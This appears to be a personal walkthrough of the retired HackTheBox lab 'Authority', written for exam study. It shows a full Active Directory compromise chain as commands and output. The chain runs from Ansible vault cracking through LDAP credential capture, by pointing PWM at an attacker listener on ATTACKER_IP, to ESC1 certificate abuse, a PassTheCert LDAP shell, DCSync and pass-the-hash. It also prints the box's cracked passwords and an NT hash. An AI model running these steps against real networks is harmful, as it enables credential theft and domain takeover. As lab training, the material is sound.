# AUTHORITY — Medium

**Date Started:** June 17, 2026
**Date Completed:** June 18, 2026
**Difficulty:** Medium
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, Ansible Vault, PWM, ADCS ESC1, PassTheCert, LDAP Credential Interception
**Status:** COMPLETE

---

## Summary / Attack Chain

Ansible vault-encrypted credentials from an open SMB share, cracked to access PWM Configuration Manager, then redirected PWM's LDAP connection to an attacker listener to capture the svc_ldap service account password in cleartext. Used svc_ldap to enumerate ADCS, found ESC1-vulnerable CorpVPN template restricted to Domain Computers, bypassed by creating a fake machine account. PKINIT failed (no KDC support), so used PassTheCert for an LDAP shell to escalate svc_ldap to Domain Admins, then DCSync for the Administrator hash.

```
SMB guest session → Development share → Ansible playbooks
  → ansible2john → hashcat -m 16900 → vault password (!@#$%^&*)
    → ansible-vault decrypt → pwm_admin_password (pWm_@dm!N_!23) + ldap_admin_password (DevT3st@123)
      → PWM Configuration Manager (https://target:8443)
        → Change LDAP URL to ldap://attacker:389 → nc listener captures svc_ldap password (lDaP_1n_th3_cle4r!)
          → certipy find -vulnerable → CorpVPN template (ESC1, Domain Computers enrollment only)
            → addcomputer.py → FAKECOMP$ (bypass enrollment restriction)
              → certipy req -upn administrator@authority.htb → administrator.pfx
                → certipy auth fails (KDC_ERR_PADATA_TYPE_NOSUPP, no PKINIT support)
                  → certipy cert → extract .crt + .key
                    → passthecert.py -action ldap-shell
                      → add_user_to_group svc_ldap "Domain Admins"
                        → secretsdump.py -just-dc-ntlm → Administrator hash (6961f422924da90a6928197429eea4ed)
                          → PtH → DA
```

**New techniques vs previous boxes:** Ansible vault cracking (hashcat -m 16900), LDAP credential interception via config redirect (PWM), addcomputer.py to bypass ADCS enrollment restrictions, PassTheCert (PKINIT failure fallback), LDAP shell privilege escalation.

---

## Phase 1 — Enumeration

```bash
nmap -p- -Pn --min-rate 1000 -T4 10.129.229.56 -oN authority_all_ports.txt
nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,8443,47001 -Pn -sC -sV 10.129.229.56 -oN authority_services.txt
```

**Findings / reads:**
- **DC fingerprint** (53/88/389/636/3268/3269/445) — Domain Controller.
- **Domain: `authority.htb`**, Host: `AUTHORITY`.
- **Port 8443** — PWM (Password Self-Service) web application.
- **Port 5985 (WinRM)** — open, available with valid creds.
- **Clock skew ~4 hours** — must sync before any Kerberos operations.
- SMB signing required — relay off the table.

```bash
echo "10.129.229.56 authority.htb DC01.authority.htb" | sudo tee -a /etc/hosts
sudo ntpdate 10.129.229.56
```

---

## Phase 2 — SMB Guest Session + Ansible Files

```bash
nxc smb 10.129.229.56 -u '' -p '' --shares
```

Guest access reveals a **Development** share with READ access.

```bash
smbclient //10.129.229.56/Development -U '' -N -c 'recurse ON; prompt OFF; mget *'
```

The share contains Ansible playbooks and configuration files. Key find in `Automation/Ansible/PWM/defaults/main.yml`: three Ansible vault-encrypted blobs for `pwm_admin_login`, `pwm_admin_password`, and `ldap_admin_password`.

---

## Phase 3 — Ansible Vault Cracking

### Extract vault blobs

Each `!vault` block must be saved as a standalone file with the vault header and indented ciphertext.

### Convert to hashcat format

```bash
ansible2john pwm_admin_hash.yml > pwm_hash.txt
ansible2john ldap_hash.yml > ldap_hash.txt
```

### Crack on Mac GPU

```bash
scp pwm_hash.txt ldap_hash.txt mac:~/loot/
# On Mac:
hashcat -m 16900 pwm_hash.txt ~/wordlists/rockyou.txt
```

| Flag | Meaning |
|------|---------|
| `-m 16900` | Ansible Vault |

**Vault password: `!@#$%^&*`** — same password for all three blobs.

### Decrypt

```bash
ansible-vault decrypt pwm_admin_hash.yml --output pwm_admin_pass.txt
ansible-vault decrypt ldap_hash.yml --output ldap_pass.txt
```

**Decrypted values:**
- `pwm_admin_password`: `pWm_@dm!N_!23`
- `ldap_admin_password`: `DevT3st@123`

Neither password works for direct domain authentication (these are application-level passwords, not domain credentials).

---

## Phase 4 — PWM LDAP Credential Interception

### Access PWM Configuration Manager

Navigate to `https://10.129.229.56:8443` → Configuration Manager → authenticate with `pWm_@dm!N_!23`.

### Redirect LDAP connection

In the LDAP settings, change the LDAP server URL from the legitimate DC to the attacker's listener:
```
ldap://ATTACKER_IP:389
```

### Capture credentials

On the attack host, start a listener:
```bash
nc -lvnp 389
```

Click "Test LDAP Profile" in PWM. The application authenticates to the attacker's "LDAP server" and sends the `svc_ldap` service account credentials in cleartext.

**`svc_ldap : lDaP_1n_th3_cle4r!`**

```bash
nxc smb 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'    # Valid domain creds
```

> **Lesson:** This is the same pattern family as xp_dirtree + Responder: "redirect outbound authentication to yourself." Any application that lets you change its backend connection URL is a potential credential interception vector. The key recognition trigger is: you control a config panel that points to an authentication target. Redirect it to yourself.

---

## Phase 5 — ADCS Enumeration + ESC1

```bash
certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
```

**Finding:** `CorpVPN` template is vulnerable to **ESC1**:
- `ENROLLEE_SUPPLIES_SUBJECT: True` — requester controls the SAN (Subject Alternative Name)
- Client Authentication EKU — certificate can be used for authentication
- **Enrollment restricted to Domain Computers group** — svc_ldap cannot enroll directly

### Bypass enrollment restriction with addcomputer.py

The default `ms-DS-MachineAccountQuota` is 10, meaning any domain user can create up to 10 computer accounts.

```bash
addcomputer.py -computer-name FAKECOMP -computer-pass 'FakePass123!' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
```

### Request certificate as Administrator

```bash
certipy req -u 'FAKECOMP$@authority.htb' -p 'FakePass123!' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dc-ip 10.129.229.56 -target 10.129.229.56
```

| Flag | Meaning |
|------|---------|
| `-upn administrator@authority.htb` | ESC1 exploit: set the SAN to impersonate Administrator |
| `-ca AUTHORITY-CA` | Target Certificate Authority |
| `-template CorpVPN` | Vulnerable template |

**`administrator.pfx` saved.**

---

## Phase 6 — PassTheCert (PKINIT Failure Fallback)

### Attempt PKINIT authentication

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56
```

**Fails with `KDC_ERR_PADATA_TYPE_NOSUPP`** — the DC does not support PKINIT (certificate-based Kerberos authentication). This is the trigger for the PassTheCert path.

### Extract cert and key from PFX

```bash
certipy cert -pfx administrator.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
```

### LDAP shell via PassTheCert

```bash
python3 /opt/PassTheCert/Python/passthecert.py -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56 -action ldap-shell
```

PassTheCert uses the certificate for LDAP authentication (which works even when PKINIT doesn't) and provides an interactive LDAP shell with the certificate holder's privileges.

### Escalate svc_ldap to Domain Admins

```
# add_user_to_group svc_ldap "Domain Admins"
```

---

## Phase 7 — DCSync + DA

```bash
secretsdump.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!@10.129.229.56' -just-dc-ntlm
```

**Administrator NT hash: `6961f422924da90a6928197429eea4ed`**

```bash
evil-winrm -i 10.129.229.56 -u administrator -H 6961f422924da90a6928197429eea4ed
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | *(instance-specific)* |
| root.txt | *(instance-specific)* |

*(HTB flags rotate per spawn.)*

---

## Mistakes / Tool Issues

Infra and tooling issues only. No decision-making errors on technique selection.

1. **Machine account didn't persist across box respawn.** Created FAKECOMP$ with addcomputer.py, but the box respawned between attempts. The account showed `(Guest)` in nxc (meaning it didn't actually exist). Fix: re-run addcomputer.py after each box respawn.

2. **certipy NETBIOS timeout with hostname target.** Using `-target dc01.authority.htb` caused timeouts. Fix: use `-target 10.129.229.56` (IP directly).

3. **Clock skew not synced.** Kerberos operations fail with 4-hour clock skew. Must run `sudo ntpdate <dc-ip>` before any certipy/Kerberos commands.

4. **passthecert.py path.** Not in PATH or /opt/tools. Located at `/opt/PassTheCert/Python/passthecert.py`.

5. **LDAP shell command mismatch.** Expected `grant_dcsync` but this version of passthecert.py uses `add_user_to_group`. Always check `help` for available commands.

6. **Ansible vault blob extraction.** First attempt extracted wrong blob (used pwm_admin pattern for both). Each vault block in the YAML needs separate extraction with correct sed patterns.

**Solo rating: 🟡 infra issues** — all attack path decisions were correct. Only needed help with tooling errors (box respawn, certipy timeout, passthecert path/commands, vault blob extraction syntax).

---

## Lessons / Exam Relevance

- **LDAP credential interception via config redirect.** Same pattern as xp_dirtree + Responder: redirect outbound auth to yourself. Recognition trigger: you control a configuration panel that specifies an authentication backend URL. Change it to your listener and capture cleartext credentials.
- **Ansible vault cracking.** `ansible2john` converts vault blobs to hashcat format. Mode 16900. Vault blobs in config management files (Ansible, Chef, Puppet) are common in enterprise environments.
- **ADCS enrollment restriction bypass.** When a template restricts enrollment to Domain Computers, create a fake computer account with `addcomputer.py`. Default `ms-DS-MachineAccountQuota` is 10, so any domain user can do this. The computer account is a legitimate member of Domain Computers.
- **PassTheCert fallback.** When PKINIT fails (`KDC_ERR_PADATA_TYPE_NOSUPP`), the certificate is still valid for LDAP authentication. Extract cert and key from the PFX, then use `passthecert.py` for an LDAP shell. LDAP auth with certs works independently of Kerberos PKINIT support.
- **LDAP shell privilege escalation.** The LDAP shell from PassTheCert runs with the certificate holder's privileges (Administrator in this case). Use it to add users to groups, grant DCSync rights, or modify ACLs. Check `help` for available commands since different versions offer different actions.
- **Clock sync before Kerberos.** Any Kerberos operation (certipy, getTGT, etc.) fails silently or with cryptic errors if clock skew exceeds 5 minutes. Always sync: `sudo ntpdate <dc-ip>`.

## Cleanup / Changes Made

- Created FAKECOMP$ computer account via addcomputer.py.
- Modified PWM LDAP configuration URL (redirected to attacker).
- Added svc_ldap to Domain Admins group via LDAP shell.
- Requested certificate as administrator@authority.htb from AUTHORITY-CA.
